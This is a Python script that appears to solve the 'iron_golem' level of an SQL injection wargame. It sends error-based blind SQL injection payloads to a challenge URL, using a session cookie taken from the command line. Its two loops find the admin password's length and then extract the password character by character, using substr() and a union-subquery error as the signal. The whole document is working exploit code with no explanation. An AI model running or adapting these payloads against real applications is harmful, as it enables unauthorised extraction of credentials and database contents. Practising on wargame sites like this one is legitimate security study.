import urllib.request
import sys

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?"
cookie = sys.argv[1]
pw = ''
letter = "abcdef1234567890"

for i in range(100):
  query = "pw=%27||id=%27admin%27%26%26if(length(pw)={},(select%201%20union%20select%202),2)%23".format(i)
  req = urllib.request.Request(
    url+query,
    data=None,
    headers={
      "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
      "Cookie" : cookie
    })
  with urllib.request.urlopen(req) as res:
    body = res.read().decode()
  if '<hr>query' not in body:
    pw_len = i
    break
print(pw_len)

for i in range(1, pw_len+1):
  for j in letter:
    query = "pw=%27||id=%27admin%27%26%26if(substr(pw,{},1)=%27{}%27,(select%201%20union%20select%202),2)%23".format(i,j)
    req = urllib.request.Request(
      url+query,
      data=None,
      headers={
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Cookie" : cookie
      })
    with urllib.request.urlopen(req) as res:
      body = res.read().decode()
    if '<hr>query' not in body:
      pw += j
      break
print(pw)
